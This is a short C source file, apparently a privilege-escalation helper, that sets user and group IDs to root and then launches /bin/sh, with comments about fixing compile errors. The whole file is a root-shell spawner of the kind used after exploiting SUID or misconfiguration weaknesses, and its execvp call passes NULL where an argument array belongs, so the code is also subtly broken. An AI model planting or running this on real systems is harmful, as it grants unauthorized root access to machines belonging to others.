#include <stdio.h>
#include <unistd.h>  // Add this header for setuid, setgid, seteuid, setegid, execvp

int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL);  // Remove the extra argument here
}

